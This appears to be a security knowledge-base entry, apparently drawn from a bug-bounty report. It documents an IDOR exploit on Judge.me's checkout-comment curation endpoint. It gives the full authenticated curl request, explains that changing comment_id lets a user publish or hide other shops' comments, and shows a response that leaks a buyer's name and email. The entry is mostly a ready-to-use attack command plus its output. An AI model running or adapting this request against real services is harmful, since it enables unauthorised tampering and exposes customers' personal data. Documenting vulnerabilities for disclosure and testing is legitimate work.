---
id: uuid-curate-post
data: >-
  curl -X POST 'https://judge.me/extensions/checkout_comments/curate_comment' -H
  'Cookie: _judgeme_session=███████████████; _ga=GA1.2.1935027813.1637882690;
  _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048;
  _gat_UA-28424713-2=1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0)
  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36' -H
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H
  'X-Csrf-Token: ████==' -H 'X-Requested-With: XMLHttpRequest' -d
  'comment_id=1&curated=ok'
tags:
  - http-post
  - idor
  - api-exploit
type: command
output: >-
  {"comment":{"id":1,"content":"classic dress watch for
  weddings","created_at":"over 3 years ago","product":{"title":"Dress
  Watch","url":"https://████.myshopify.com/products/dress-watch"},"buyer":{"name":"F
  F","email":"██████████@gmail.com"},"published_status":true,"published_status_text":"Published","curated":"ok"}}
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:47.287Z'
verified: false
validated: true
submitted: true
---
---

# curate-comment-post

## Command

```bash
curl -X POST 'https://judge.me/extensions/checkout_comments/curate_comment' \
  -H 'Cookie: _judgeme_session=███████████████; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50' \
  -H 'X-Csrf-Token: ████==' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-raw 'comment_id=1&curated=ok'
```

## Description

This curl command replicates the POST request to the Judge.me curate_comment endpoint, used to publish or hide comments. Modifying comment_id exploits IDOR to target foreign comments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `comment_id` | ID of the comment to curate; modify for IDOR | Yes |
| `curated` | Status to set ('ok' for publish, 'hidden' for hide) | Yes |
| Cookie headers | Session and tracking cookies for authentication | Yes |
| X-Csrf-Token | CSRF protection token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://judge.me/extensions/checkout_comments/curate_comment' -H 'Content-Type: application/x-www-form-urlencoded' -d 'comment_id=1&curated=ok'
```

### Advanced Usage (with full headers for authenticated session)

Use the full command above with valid cookies and token.

## Expected Output

JSON object containing comment details, including leaked buyer name, email, and product info if IDOR successful.

## Related

- [[procedures/Exploit-IDOR-for-Foreign-Comment-Access]]

